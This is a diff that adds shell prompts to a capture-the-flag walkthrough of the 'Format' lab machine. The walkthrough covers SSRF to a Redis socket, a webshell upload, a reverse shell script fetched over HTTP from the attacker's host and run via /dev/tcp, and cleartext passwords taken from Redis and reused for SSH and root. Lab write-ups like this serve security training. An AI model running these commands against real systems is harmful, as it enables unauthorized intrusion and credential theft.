@@ -18,8 +18,8 @@ Format is a medium Linux box running a small PHP microblogging app, `microblog.h
 ## recon
 
 ```bash
-nmap -p- --min-rate 10000 10.129.30.163
-nmap -p22,80,3000 -sCV 10.129.30.163
+$ nmap -p- --min-rate 10000 10.129.30.163
+$ nmap -p22,80,3000 -sCV 10.129.30.163
 ```
 
 Three ports.
@@ -35,7 +35,7 @@ Three ports.
 OpenSSH 8.4p1 is Debian 11. Port 3000 redirects to `microblog.htb:3000`, so I put the host in `/etc/hosts` and started enumerating subdomains. The app lives on the `app.` and `admin.` vhosts:
 
 ```bash
-echo '10.129.30.163 microblog.htb app.microblog.htb admin.microblog.htb' | sudo tee -a /etc/hosts
+$ echo '10.129.30.163 microblog.htb app.microblog.htb admin.microblog.htb' | sudo tee -a /etc/hosts
 ```
 
 Port 3000 is Gitea, and it serves `cooper/microblog` publicly, which is the complete application source. That is the gift of the box: I can read the vulnerable code instead of guessing at it. The repo has the live app, a blog template (`microblog-template`) whose `fetchPage()` reads a list of content files out of `order.txt` and `file_get_contents()`s each one into the page, and a `pro-files` folder gated behind the pro tier.
@@ -119,10 +119,10 @@ So if I `HSET <user> pro true` against the socket, that account becomes pro. I b
 
 ```bash
 # keep an account registered
-curl http://app.microblog.htb/register/index.php -d 'first-name=test&last-name=test&username=test&password=test'
+$ curl http://app.microblog.htb/register/index.php -d 'first-name=test&last-name=test&username=test&password=test'
 
 # HSET test pro true, routed through the proxy onto the redis socket
-curl -X "HSET" 'http://microblog.htb/static/unix:%2fvar%2frun%2fredis%2fredis.sock:test%20pro%20true%20a/b'
+$ curl -X "HSET" 'http://microblog.htb/static/unix:%2fvar%2frun%2fredis%2fredis.sock:test%20pro%20true%20a/b'
 ```
 
 `%2f` is the URL-encoded `/` in the socket path, `%20` the spaces between the Redis command arguments. With `pro` flipped to `true`, the account unlocks the pro features, which include a writable `uploads` directory. The key fact about the layout: PHP placed in `/uploads` executes, while `/content` is served as a plain download. So the webshell has to go in `/uploads`.
@@ -168,11 +168,11 @@ To upgrade to a proper shell I served a reverse-shell script and ran it through 
 
 ```bash
 # attacker
-echo 'sh -i >& /dev/tcp/10.10.16.60/1337 0>&1' > rev.sh
-python3 -m http.server 8888
+$ echo 'sh -i >& /dev/tcp/10.10.16.60/1337 0>&1' > rev.sh
+$ python3 -m http.server 8888
 # via ?cmd=
-curl http://10.10.16.60:8888/rev.sh -o /tmp/rev.sh
-bash /tmp/rev.sh
+$ curl http://10.10.16.60:8888/rev.sh -o /tmp/rev.sh
+$ bash /tmp/rev.sh
 ```
 
 That dropped me on the box as `www-data`.
@@ -182,7 +182,7 @@ That dropped me on the box as `www-data`.
 With a shell I talked to Redis directly over its socket instead of through nginx. The default TCP port refused me; the socket is the way in. `KEYS *` listed the stored users:
 
 ```bash
-redis-cli -s /var/run/redis/redis.sock KEYS '*'
+$ redis-cli -s /var/run/redis/redis.sock KEYS '*'
 ```
 
 ```
@@ -196,7 +196,7 @@ redis-cli -s /var/run/redis/redis.sock KEYS '*'
 `cooper.dooper` is the real user's profile hash. `HGETALL` dumped it:
 
 ```bash
-redis-cli -s /var/run/redis/redis.sock hgetall "cooper.dooper"
+$ redis-cli -s /var/run/redis/redis.sock hgetall "cooper.dooper"
 ```
 
 ```
@@ -210,7 +210,7 @@ redis-cli -s /var/run/redis/redis.sock hgetall "cooper.dooper"
 The app stores the password in cleartext in Redis, and cooper reused it for the system account. SSH straight in:
 
 ```bash
-ssh cooper@microblog.htb
+$ ssh cooper@microblog.htb
 # password: zooperdoopercooper
 ```
 
@@ -260,9 +260,9 @@ microblogunCR4ckaBL3Pa$$w0rd...jackjack
 `unCR4ckaBL3Pa$$w0rd` is the secret, and it doubles as the root password:
 
 ```bash
-su
+$ su
 # password: unCR4ckaBL3Pa$$w0rd
-cat /root/root.txt
+$ cat /root/root.txt
 ```
 
 root.
